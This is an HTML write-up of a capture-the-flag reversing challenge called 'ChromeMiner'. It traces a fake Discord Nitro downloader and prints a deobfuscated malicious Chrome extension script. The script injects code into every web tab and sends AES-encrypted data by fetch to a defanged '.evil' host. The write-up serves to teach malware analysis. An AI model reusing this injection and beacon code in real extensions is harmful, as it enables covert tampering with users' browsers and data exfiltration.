@@ -1,0 +1,139 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ChromeMiner</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">ChromeMiner</h1>
+<p class="spacing-64" \>
+
+<p class="spacing-64" \>
+
+
+<p>
+This reversing challenge starts with a website that you can access after
+starting the instance. Nothing on the web page works, but if you check the page
+source, you can find a link to an <code>exe</code> file:
+<code>href="/static/nitro/DiscurdNitru.exe"</code>. If you open it in IDA Pro, you can see
+it's an extremely simple program that downloads a <code>ZIP</code> file extracts it to a
+directory and runs it. One of the strings has the path for the <code>ZIP</code> file:
+<code>/c2VjcmV0/archive.zip?k=ZGlzY3VyZG5</code>.
+</p>
+
+<p>
+After downloading the file and extracting the contents, there is a <code>JavaScript</code>
+file that is obviously obfuscated. It contains two gigantic lists with bytes
+that can be turned into plain text strings, being that the first step to
+deobfuscate the file. After understanding what each element of both lists
+represent, its as easy as using your Web Browser console to decode all the
+string concatenation happening and the partially (and decently) deobfuscated
+file will look like this:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-javascript"><span class="org-keyword">async</span> <span class="org-keyword">function</span> iF() {
+  <span class="org-keyword">if</span> (!(<span class="org-string">"injected"</span> <span class="org-keyword">in</span> document)) {
+    document[<span class="org-string">"injected"</span>] = <span class="org-constant">true</span>;
+    window[<span class="org-string">"setInterval"</span>](<span class="org-keyword">async</span> () =&gt; {
+      y = <span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"Uint8Array"</span>](64);
+      window[<span class="org-string">"crypto"</span>][<span class="org-string">"getRandomValues"</span>](y);
+      <span class="org-keyword">if</span> (<span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"TextDecoder"</span>](<span class="org-string">"utf-8"</span>)[<span class="org-string">"decode"</span>](
+              <span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"digest"</span>](
+                  <span class="org-string">"sha-256"</span>, y))[<span class="org-string">"endsWith"</span>](<span class="org-string">"chrome"</span>)) {
+        j = <span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"Uint8Array"</span>](
+            y[<span class="org-string">"ByteLength"</span>] + (<span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"digest"</span>](
+                                  <span class="org-string">"sha-256"</span>, y))[<span class="org-string">"byteLength"</span>]);
+        j[<span class="org-string">"set"</span>](<span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"Uint8Array"</span>](y), 0);
+        j[<span class="org-string">"set"</span>](<span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"Uint8Array"</span>](
+                     <span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"digest"</span>](<span class="org-string">"sha-256"</span>, y)),
+                 y[<span class="org-string">"byteLength"</span>]);
+        window[<span class="org-string">"fetch"</span>](
+            <span class="org-string">"hxxps://qwertzuiop123.evil/"</span> +
+            [...<span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"Uint8Array"</span>](
+                <span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"encrypt"</span>](
+                    {
+                      [<span class="org-string">"name"</span>] : <span class="org-string">"AES-CBC"</span>,
+                      [<span class="org-string">"iv"</span>] : <span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"TextEncoder"</span>](<span class="org-string">"utf-8"</span>)[<span class="org-string">"encode"</span>](
+                          <span class="org-string">"_NOT_THE_SECRET_"</span>)
+                    },
+                    <span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"importKey"</span>](
+                        <span class="org-string">"raw"</span>,
+                        <span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"decrypt"</span>](
+                            {
+                              [<span class="org-string">"name"</span>] : <span class="org-string">"AES-CBC"</span>,
+                              [<span class="org-string">"iv"</span>] :
+                                  <span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"TextEncoder"</span>](<span class="org-string">"utf-8"</span>)[<span class="org-string">"encode"</span>](
+                                      <span class="org-string">"_NOT_THE_SECRET_"</span>)
+                            },
+                            <span class="org-keyword">await</span> window[<span class="org-string">"crypto"</span>][<span class="org-string">"subtle"</span>][<span class="org-string">"importKey"</span>](
+                                <span class="org-string">"raw"</span>,
+                                <span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"TextEncoder"</span>](<span class="org-string">"utf-8"</span>)[<span class="org-string">"encode"</span>](
+                                    <span class="org-string">"_NOT_THE_SECRET_"</span>),
+                                {[<span class="org-string">"name"</span>] : <span class="org-string">"AES-CBC"</span>}, <span class="org-constant">true</span>, [ <span class="org-string">"decrypt"</span> ]),
+                            <span class="org-keyword">new</span> <span class="org-type">window</span>[<span class="org-string">"Uint8Array"</span>]((
+                                <span class="org-string">"E242E64261D21969F65F954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8"</span>)
+                                                         [<span class="org-string">"match"</span>](
+                                                             <span class="org-string">/../</span>g)[<span class="org-string">"map"</span>](
+                                                             h =&gt; window
+                                                                 [<span class="org-string">"parseInt"</span>](
+                                                                     h, 16)))),
+                        {[<span class="org-string">"name"</span>] : <span class="org-string">"AES-CBC"</span>}, <span class="org-constant">true</span>, [ <span class="org-string">"encrypt"</span> ]),
+                    j)) ][<span class="org-string">"map"</span>](
+                x =&gt; x[<span class="org-string">"toString"</span>](16)[<span class="org-string">"padStart"</span>](2, <span class="org-string">"0"</span>))[<span class="org-string">"join"</span>](<span class="org-string">""</span>));
+      }
+    }, 1);
+  }
+};
+
+chrome[<span class="org-string">"tabs"</span>][<span class="org-string">"onUpdated"</span>][<span class="org-string">"addListener"</span>]((tabVar, changeInfo, tab) =&gt; {
+  <span class="org-keyword">if</span> (<span class="org-string">"url"</span> <span class="org-keyword">in</span> tab &amp;&amp; tab[<span class="org-string">"url"</span>] != <span class="org-constant">null</span> &amp;&amp;
+      (tab[<span class="org-string">"url"</span>][<span class="org-string">"startsWith"</span>](<span class="org-string">"https://"</span>) ||
+       tab[<span class="org-string">"url"</span>][<span class="org-string">"startsWith"</span>](<span class="org-string">"http://"</span>))) {
+    chrome[<span class="org-string">"scripting"</span>][<span class="org-string">"executeScript"</span>](
+        {[<span class="org-string">"target"</span>] : {[<span class="org-string">"tabId"</span>] : tab[<span class="org-string">"id"</span>]}, <span class="org-keyword">function</span> : iF});
+  }
+});
+</pre>
+</div>
+
+<p>
+So, summarizing what this probably does when running: if you open a tab, it
+checks if the tab has a valid URL opened, and it will execute some kind of code
+that periodically generates a value, hashes it using <code>SHA-256</code> and verifies if the
+last set of characters spells "chrome". It also uses <code>AES-CBC</code> to encrypt and
+decrypt whatever, using the same <code>key</code> and <code>iv</code>: <code>_NOT_THE_SECRET_</code>. The encrypted
+string is
+<code>E242E64261D21969F65F954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8</code>,
+and the goal is to decrypt it using <code>AES-CBC</code> using the <code>key</code> and <code>iv</code> mentioned. You
+can do this in Python or even use any web tool and you will get the flag!
+</p>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">01-02-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
